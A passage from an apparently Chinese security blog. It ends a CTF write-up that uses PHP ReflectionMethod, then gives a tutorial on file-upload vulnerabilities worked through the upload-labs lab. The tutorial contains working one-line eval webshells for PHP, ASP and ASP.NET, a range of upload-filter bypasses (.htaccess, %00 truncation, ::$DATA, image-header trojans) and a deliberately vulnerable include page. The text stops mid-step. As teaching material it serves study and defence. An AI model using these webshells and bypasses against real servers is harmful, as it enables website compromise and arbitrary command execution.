class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);</span><br><span class="line">var_dump(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure><p>分析题目，猜测 flag 是藏在类的注释中，我们能够实例化任意类，并调用类方法，那么就可以利用 PHP 内置类中的 <code>ReflectionMethod</code> 来读取 <code>User</code> 类里面各个函数的注释。</p><p>构造成题目中的 http 参数则是：<code>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code></p><p>因为不知道是在哪个函数的注释中，所以逐个函数暴破，暴破 <code>rb</code> 的值 <code>a-z</code>，可以发现 <code>flag</code> 在 <code>q</code> 的注释中。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1223846800.png" alt="1223846800"></p><p>其他题目质量很不错（爆0），根本没有思路，大佬的wp如下：</p><p><a href="http://www.xl-bit.cn/index.php/archives/434/">http://www.xl-bit.cn/index.php/archives/434/</a></p><p><a href="http://www.snowywar.top/?p=2190">http://www.snowywar.top/?p=2190</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>[1] <a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a></p><p>[2] <a href="https://www.136.la/mysql/show-47821.html">SQLi —— 逗号，空格，字段名过滤突破(示例代码)</a></p><p>[3] <a href="https://blog.csdn.net/weixin_45669205/article/details/116064642?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">[GYCTF2020]Ezsqli（Mysql逐位比较）</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ciscn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞学习</title>
      <link href="posts/13382.html"/>
      <url>posts/13382.html</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传简介"><a href="#文件上传简介" class="headerlink" title="文件上传简介"></a>文件上传简介</h1><p>文件上传，顾名思义就是上传文件的功能行为。将客户端数据以文件形式封装，通过网络协议发送到服务器端。在服务器端解析数据，最终在服务端硬盘上作为真实的文件保存。</p><p><strong>漏洞产生原因</strong>：大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过 Web 访问的目录上传任意 PHP 文件，并能够将这些文件传递给 PHP 解释器，就可以在远程服务器上执行任意PHP脚本。另外，服务器配置不当、开源编辑器的上传漏洞、文件上传限制被绕过、文件解析漏洞导致文件执行等都有可能产生文件上传漏洞。</p><p><strong>漏洞危害</strong>:当系统存在文件上传漏洞时，攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，服务器如果对其解析执行则会造成很大的危害。</p><blockquote><p>WebShell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些 asp 或 php 后门文件与网站服务器 web 目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p></blockquote><h1 id="绕过文件检测"><a href="#绕过文件检测" class="headerlink" title="绕过文件检测"></a>绕过文件检测</h1><p>通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般一个文件上传过程中的<strong>检测方式</strong>有∶</p><ol><li>客户端JavaScript检测（检测文件扩展名）</li><li>服务端MIME类型检测（检测content-type内容)</li><li>服务端目录路径检测（检测跟path参数相关的内容)</li><li>服务端文件内容检测（检测内容是否合法或含有恶意代码）等。</li></ol><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416130421578.png" alt="image-20210416130421578"></p><h2 id="绕过客户端检测"><a href="#绕过客户端检测" class="headerlink" title="绕过客户端检测"></a>绕过客户端检测</h2><p>原理：通常在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测文件类型和扩展名是否合法。</p><p>方法：在本地浏览器客户端禁用JS即可;可使用火狐浏览器的Noscript插件、IE中禁用JS等方式实现。</p><p>测试：upload-labs/Pass-01</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415231636662.png" alt="image-20210415231636662"></p><p>这里的js检测文件的扩展名，只允许.jpg、.png、.gif文件上传。</p><p>但我们可以禁用此js，或者用burp抓包修改文件类型（上传1.jpg修改为1.php）</p><p>按照惯例，上传最简单的一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415233539502.png" alt="image-20210415233539502"></p><p>查看phpinfo()</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415234903809.png" alt="image-20210415234903809"></p><p>上菜刀，可以看到整个网站的结构和文件，甚至是暴露了主机的磁盘存储！！可以进行任意非法增删查改！！网站（主机）至此沦陷……</p><blockquote><p>**”中国菜刀”**：仅需要一段简短的代码便可以管理网站。目前支持的服务器端脚本包括: php、ASP、ASP.NET、JSP等，并且支持HTTPS安全连接的网站。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP: &lt;?php @eval($_POST[&#39;mima&#39;]);?&gt;</span><br><span class="line">ASP: &lt;%eval request(&quot;mima&quot;)%&gt;</span><br><span class="line">ASP.NET &lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;mima&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415234719164.png" alt="image-20210415234719164"></p><h2 id="绕过MIME类型检测"><a href="#绕过MIME类型检测" class="headerlink" title="绕过MIME类型检测"></a>绕过MIME类型检测</h2><p>原理：检测图片类型文件上传过程中http包的Content-Type字段的值，来判断上传文件是否合法。</p><p>绕过方法：用burpsuite截取并修改数据包中文件的content-type类型进行绕过。</p><p>常见MIME类型：</p><ul><li>html文件：text/html</li><li>txt文件：text/plain</li><li>pdf文档：application/pdf</li><li>word文件：application/msword</li><li>png图片：image/png</li><li>jpeg图片：image/jpeg</li><li>gif图片：image/gif</li></ul><p>测试：upload-labs/Pass-02</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132434036.png" alt="image-20210416132434036"></p><p>通过其源码发现仅仅判断content-type类型，因此上传1.php抓包修改content-type为图片类型：image/jpeg、image/png、image/gif</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132812123.png" alt="image-20210416132812123"></p><p>成功利用</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132939840.png" alt="image-20210416132939840"></p><h2 id="绕过黑名单检测"><a href="#绕过黑名单检测" class="headerlink" title="绕过黑名单检测"></a>绕过黑名单检测</h2><p>黑名单策略</p><p>文件扩展名在黑名单中为不合法，一般有个专门的blacklist文件，里面会包含常见的危险脚本文件。</p><p>绕过方法</p><p><strong>1.后缀大小写绕过</strong>：</p><p>在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。</p><p>测试：upload-labs/Pass-06</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221001633.png" alt="image-20210418221001633"></p><p>这里对文件后缀进行了限制，但未对字母大小写做任何处理，可以大小写绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221031495.png" alt="image-20210418221031495"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221148741.png" alt="image-20210418221148741"></p><p><strong>2.空格绕过:</strong></p><p>如果黑名单没有对后缀名进行去空处理，可以通过在后缀名后加空进行绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p><strong>3.点绕过:</strong></p><p>如果黑名单没有对后缀名进行去.处理，利用Windows系统的文件名特性,会自动去掉后缀名最后的.，通过在文件名后加.进行绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure><p>4.<code>::$DATA</code>绕过:</p><p>如果黑名单没有对后缀名进行去<code>::$DATA</code>处理，利用Windows下NTFS文件系统的一个特性（在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”<code>::$DATA</code>“之前的文件名），可以在后缀名后加<code>::$DATA</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418225806235.png" alt="image-20210418225806235"></p><p><strong>5.双后缀名绕过:</strong></p><p>如果黑名单是将问题后缀名替换为空，可以利用双写绕过进行文件上传。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><p><strong>6.配合文件解析漏洞绕过:</strong></p><ol><li><p>IIS解析漏洞<br>在IIS6.0的情况下有三种可以利用的手段</p><ul><li>建立<code>*.asa</code>、<code>*.asp</code>格式的文件夹时其目录下的文件都会当做asp文件解析。</li><li>当文件名为<code>*.asp;1.jpg</code>时，IIS会以ASP文件来解析，也就是说;起到了截断作用。</li><li>WebDav漏洞，借助put方法直接向服务器上传危险脚本</li></ul></li><li><p>Apache解析漏洞<br>在Apache 1.X与Apache 2.X中如果碰到文件名为<code>demo.php.test</code>的文件会按php文件进行解析，根据Apache的解析规则，如果碰到不认识的拓展名便会进行遍历，直到碰到能够解析的拓展名。</p><blockquote><p>在Apache根目录的coof/mime.types文件中有详细的可识别拓展名。</p></blockquote></li><li><p>Nginx解析漏洞</p></li></ol><p>在Nginx的服务器环境下，假如成功上传一张名为test.jpg的文件到网站根目录下，如果我们访问<code>www.demo.com/test.jpg/test.php</code>这个虚构的目录服务器则会直接将test.jpg作为php文件进行解析。</p><p><strong>7.htaccess绕过</strong></p><p>当上传<code>.htaccess</code>文件到网站目录时，该目录下的文件会按其配置生效解析。</p><p>条件</p><ul><li>apache服务器</li><li>能够上传.htaccess文件，一般为黑名单限制。</li><li>AllowOverride All（默认配置为关闭None）</li><li>LoadModule rewrite_module modules/mod_rewrite.so #rewrite模块为开启状态</li><li>上传目录具有可执行权限。</li></ul><p>测试：upload-labs/Pass-04</p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该代码对常见的多种类型文件后缀名进行了限制上传，但是仔细可以发现，并没有对<code>htaccess</code>文件进行限制。于是，我们可以先上传一个<code>htaccess</code>文件，再上传一个图片马，进行绕过检测上传。</p><p>.htaccess文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>这样所有文件都会当成php来解析</p><h2 id="绕过白名单检测"><a href="#绕过白名单检测" class="headerlink" title="绕过白名单检测"></a>绕过白名单检测</h2><p>白名单策略：文件扩展名不在白名单中为不合法。</p><p>绕过方法：服务端判断文件类型是从后往前判断，而对文件解析是从前往后解析，可以利用00截断的方<br>式进行绕过。如应用本来只允许上传jpg图片，那么可以构造文件名为<code>xxx.php%00.jpg</code>,其中<code>%00</code>为十六进制的<code>0x00</code>字符，.jpg骗过了应用的上传文件类型检测，但对于服务器来说，因为<code>%00</code>字符截断的关系，最终上传的文件变成了<code>xxx.php</code>。</p><p>测试：upload-labs/Pass-12</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418232436067.png" alt="image-20210418232436067"></p><p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><blockquote><p>截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418232327452.png" alt="image-20210418232327452"></p><h2 id="绕过文件内容检测"><a href="#绕过文件内容检测" class="headerlink" title="绕过文件内容检测"></a>绕过文件内容检测</h2><p>文件头校验原理：判断文件头内容是否符合要求。</p><p>常见的文件头对应关系：</p><ul><li>.jpeg、jpg：JPGGraphicFile</li><li>.gif：GIF 89A</li><li>.zip：Zip Compressed</li></ul><p>绕过文件头检查：上传图片马，通过添加文件头绕过图片类型内容检查。</p><p>突破getimagesize()函数：图像文件相关信息常用检测函数，用以获取文件类型，绕过只需要把文件头部分伪造好。</p><p>测试：upload-labs/Pass-14</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作图片马(cmd下copy命令)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.gif /b + test.php /a shell.gif</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210424143058835.png" alt="image-20210424143058835"></p><p>直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210424143216004.png" alt="image-20210424143216004"></p><h1 id="上传漏洞检测"><a href="#上传漏洞检测" class="headerlink" title="上传漏洞检测"></a>上传漏洞检测</h1><ol><li>登陆网站，并打开文件上传页面。</li><li>点击“浏览”按钮，并选择本地的一个JSP文件(比如 hacker.jsp)，确认上传。</li><li>如果客户端脚本限制了上传文件的类型(比如允许gif文件)，则把 hacker.jsp 更名为 hacker.gif；配置 HTTP Proxy(burp) 进行 http 请求拦截；重新点击“浏览”按钮，并选择 hacker.gift，确认上传。</li><li>在WebScarab拦截的HTTP请求数据中，将 hacker.gif 修改为 hacker.jsp，再发送请求数据。</li><li>登陆后台服务器，用命令<code>find / -name hacker.jsp</code>查看 hacker.jsp 文件存放的路径。如果可以直接以Web方式访问，则构造访问的URL，并通过浏览器访问 hacker.jsp，如果可以正常访问，则已经取得WebShell，测试结束。如果 hacker.jsp 无法通过 web 方式访问，例如 hacker.jsp 存放在 /home/tmp/ 目录下，而 /home/tomcat/webapps 目录对应<a href="http://www.example.com/%EF%BC%8C%E5%88%99%E8%BF%9B%E8%A1%8C%E4%B8%8B%E4%B8%80%E6%AD%A5%E3%80%82">http://www.example.com/，则进行下一步。</a></li><li>重复1～3，在burp拦截的HTTP请求数据中，将hacker.gif修改为../tomcat/webapps/hacker.jsp，再发送请求数据。在浏览器地址栏输入<a 